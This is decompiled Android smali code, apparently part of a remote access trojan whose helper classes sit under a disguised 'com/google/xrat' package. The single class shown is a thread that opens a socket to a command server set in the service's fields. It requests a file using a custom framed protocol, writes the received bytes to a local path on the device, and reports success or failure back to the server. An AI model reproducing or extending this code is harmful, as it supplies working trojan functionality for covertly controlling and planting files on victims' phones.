.class final Lcom/v1/g;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lcom/v1/StreamService;

.field private b:Ljava/lang/String;

.field private c:Ljava/lang/String;

.field private d:S


# direct methods
.method public constructor <init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;S)V
    .locals 0

    iput-object p1, p0, Lcom/v1/g;->a:Lcom/v1/StreamService;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    iput-object p3, p0, Lcom/v1/g;->b:Ljava/lang/String;

    iput-object p2, p0, Lcom/v1/g;->c:Ljava/lang/String;

    iput-short p4, p0, Lcom/v1/g;->d:S

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 9

    const/4 v0, 0x0

    :try_start_0
    new-instance v1, Ljava/net/Socket;

    iget-object v2, p0, Lcom/v1/g;->a:Lcom/v1/StreamService;

    iget-object v2, v2, Lcom/v1/StreamService;->a:Ljava/lang/String;

    iget-object v3, p0, Lcom/v1/g;->a:Lcom/v1/StreamService;

    iget v3, v3, Lcom/v1/StreamService;->b:I

    invoke-direct {v1, v2, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    new-instance v3, Ljava/io/DataInputStream;

    invoke-virtual {v1}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    new-instance v4, Ljava/io/File;

    iget-object v5, p0, Lcom/v1/g;->b:Ljava/lang/String;

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/net/ConnectException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_3

    :try_start_1
    invoke-virtual {v4}, Ljava/io/File;->createNewFile()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/net/ConnectException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_3

    :try_start_2
    new-instance v5, Ljava/io/DataOutputStream;

    new-instance v6, Ljava/io/FileOutputStream;

    invoke-direct {v6, v4}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v5, v6}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    const/16 v4, 0xdd

    iget-short v6, p0, Lcom/v1/g;->d:S

    iget-object v7, p0, Lcom/v1/g;->c:Ljava/lang/String;

    invoke-static {v7}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v7

    array-length v7, v7

    iget-object v8, p0, Lcom/v1/g;->c:Ljava/lang/String;

    invoke-static {v8}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v8

    invoke-static {v4, v6, v7, v8}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/io/DataOutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    const/4 v4, 0x4

    new-array v4, v4, [B

    invoke-virtual {v3, v4}, Ljava/io/DataInputStream;->read([B)I

    invoke-static {v4}, Lcom/google/xrat/a/b;->c([B)I

    move-result v4

    const/16 v6, 0x400

    new-array v6, v6, [B

    :goto_0
    if-lt v0, v4, :cond_0

    const/16 v0, 0xdc

    iget-short v4, p0, Lcom/v1/g;->d:S

    iget-object v6, p0, Lcom/v1/g;->b:Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v6

    iget-object v7, p0, Lcom/v1/g;->b:Ljava/lang/String;

    invoke-static {v7}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v7

    invoke-static {v0, v4, v6, v7}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/DataOutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    invoke-virtual {v5}, Ljava/io/DataOutputStream;->close()V

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->close()V

    invoke-virtual {v3}, Ljava/io/DataInputStream;->close()V

    invoke-virtual {v1}, Ljava/net/Socket;->close()V

    :goto_1
    return-void

    :catch_0
    move-exception v0

    const/16 v0, 0xe5

    const/4 v4, 0x0

    const/4 v5, 0x0

    const-string v6, ""

    invoke-static {v6}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v6

    invoke-static {v0, v4, v5, v6}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/DataOutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->close()V

    invoke-virtual {v3}, Ljava/io/DataInputStream;->close()V

    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_2
    .catch Ljava/net/ConnectException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/net/ConnectException;->printStackTrace()V

    goto :goto_1

    :cond_0
    :try_start_3
    invoke-virtual {v3, v6}, Ljava/io/DataInputStream;->read([B)I

    move-result v7

    add-int/2addr v0, v7

    const/4 v8, 0x0

    invoke-virtual {v5, v6, v8, v7}, Ljava/io/DataOutputStream;->write([BII)V

    invoke-virtual {v5}, Ljava/io/DataOutputStream;->flush()V
    :try_end_3
    .catch Ljava/net/ConnectException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_0

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/net/UnknownHostException;->printStackTrace()V

    goto :goto_1

    :catch_3
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1
.end method
